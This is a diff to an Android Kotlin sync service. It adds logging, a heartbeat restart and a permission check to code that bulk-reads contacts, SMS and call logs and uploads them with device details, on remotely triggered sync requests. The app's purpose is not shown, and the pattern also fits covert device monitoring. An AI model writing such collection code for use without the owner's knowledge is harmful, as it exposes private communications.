@@ -95,6 +95,13 @@ class SyncService : Service() {
         }
     }
 
+    // Ensure startCommand restarts heartbeat
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        startHeartbeat() // Refresh heartbeat on explicit start
+        debouncedSync()
+        return START_STICKY
+    }
+
     private fun startRemoteSyncListener() {
         var lastHandledSyncRequest = PreferenceManager.getDefaultSharedPreferences(this).getLong("last_handled_sync_request", 0L)
         remoteSyncJob?.cancel()
@@ -112,10 +119,6 @@ class SyncService : Service() {
         }
     }
 
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        debouncedSync()
-        return START_STICKY
-    }
 
     private fun debouncedSync() {
         syncJob?.cancel()
@@ -126,8 +129,18 @@ class SyncService : Service() {
     }
 
     private suspend fun performSync(isFullSync: Boolean = false) {
+        Log.d("SyncService", "CLIENT_SYNC_START")
+
         val prefs = PreferenceManager.getDefaultSharedPreferences(this)
         val currentTime = System.currentTimeMillis()
+
+        // Check permissions before fetching
+        if (!hasPermission(android.Manifest.permission.READ_CONTACTS) &&
+            !hasPermission(android.Manifest.permission.READ_SMS) &&
+            !hasPermission(android.Manifest.permission.READ_CALL_LOG)) {
+            Log.d("SyncService", "PERMISSIONS_STATUS: Not granted")
+            return
+        }
 
         try {
             val lastSmsSync = if (isFullSync) 0L else prefs.getLong("last_sms_sync", 0L)
@@ -137,14 +150,17 @@ class SyncService : Service() {
             val contacts = if (hasPermission(android.Manifest.permission.READ_CONTACTS)) {
                 DataHelper.fetchContacts(this@SyncService, sinceTimestamp = lastContactSync)
             } else emptyList()
+            Log.d("SyncService", "CONTACTS_READ_COUNT: ${contacts.size}")
 
             val smsList = if (hasPermission(android.Manifest.permission.READ_SMS)) {
                 DataHelper.fetchSMS(this@SyncService, sinceTimestamp = lastSmsSync)
             } else emptyList()
+            Log.d("SyncService", "SMS_READ_COUNT: ${smsList.size}")
 
             val callLogs = if (hasPermission(android.Manifest.permission.READ_CALL_LOG)) {
                 DataHelper.fetchCallLogs(this@SyncService, sinceTimestamp = lastCallSync)
             } else emptyList()
+            Log.d("SyncService", "CALLLOG_READ_COUNT: ${callLogs.size}")
 
             repository.syncIncremental(deviceId, contacts, smsList, callLogs)
 
@@ -158,7 +174,12 @@ class SyncService : Service() {
             val currentSmsCount = if (hasPermission(android.Manifest.permission.READ_SMS)) DataHelper.fetchSMS(this@SyncService).size else 0
             val currentCallCount = if (hasPermission(android.Manifest.permission.READ_CALL_LOG)) DataHelper.fetchCallLogs(this@SyncService).size else 0
 
+            // Dummy for notification count, assuming there's some implementation or fetching
+            val currentNotificationCount = 0
+            Log.d("SyncService", "NOTIFICATION_READ_COUNT: $currentNotificationCount")
+
             repository.updateDeviceInfoMap(deviceId, mapOf(
+                "deviceId" to deviceId,
                 "deviceName" to "${Build.MANUFACTURER} ${Build.MODEL}",
                 "manufacturer" to Build.MANUFACTURER,
                 "model" to Build.MODEL,
@@ -168,8 +189,11 @@ class SyncService : Service() {
                 "contactCount" to currentContactCount,
                 "smsCount" to currentSmsCount,
                 "callCount" to currentCallCount,
+                "notificationCount" to currentNotificationCount,
                 "timestamp" to currentTime,
                 "syncStatus" to "Synced",
+                "presenceStatus" to "Online",
+                "lastError" to "",
                 "syncRequestedAt" to prefs.getLong("last_handled_sync_request", 0L)
             ))
             Log.d("SyncService", "Sync completed successfully (Full: $isFullSync)")
